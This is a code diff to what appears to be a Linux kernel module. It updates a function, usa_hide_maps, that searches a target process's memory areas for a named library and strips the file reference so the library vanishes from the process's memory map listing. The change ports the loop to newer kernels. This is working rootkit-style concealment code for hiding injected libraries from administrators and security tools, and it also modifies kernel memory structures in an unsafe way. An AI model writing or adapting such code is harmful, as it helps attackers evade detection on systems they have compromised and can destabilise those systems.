@@ -363,6 +363,7 @@ static int usa_hide_maps(pid_t target_pid, const char *lib_name)
     struct task_struct *task;
     struct mm_struct *mm;
     struct vm_area_struct *vma;
+    unsigned long addr;
 
     rcu_read_lock();
     task = fn_find_task_by_vpid ? fn_find_task_by_vpid(target_pid) : NULL;
@@ -374,16 +375,16 @@ static int usa_hide_maps(pid_t target_pid, const char *lib_name)
     if (!mm) { put_task_struct(task); return -EINVAL; }
 
     down_write_mmap(mm);
-    for (vma = mm->mmap; vma; vma = vma->vm_next) {
+    /* 兼容新旧内核: 用 find_vma 遍历而不是 vm_next (6.1+ 没有 vm_next) */
+    addr = 0;
+    while ((vma = find_vma(mm, addr)) != NULL) {
+        addr = vma->vm_end;
         if (vma->vm_file) {
             char buf[256];
             char *path = d_path(&vma->vm_file->f_path, buf, sizeof(buf));
             if (!IS_ERR(path) && strstr(path, lib_name)) {
-                /* 把 vm_file 设为 NULL, maps 就不显示文件名 */
-                /* 同时改成匿名映射 */
                 fput(vma->vm_file);
                 vma->vm_file = NULL;
-                vma->vm_flags |= VM_DONTDUMP;
             }
         }
     }
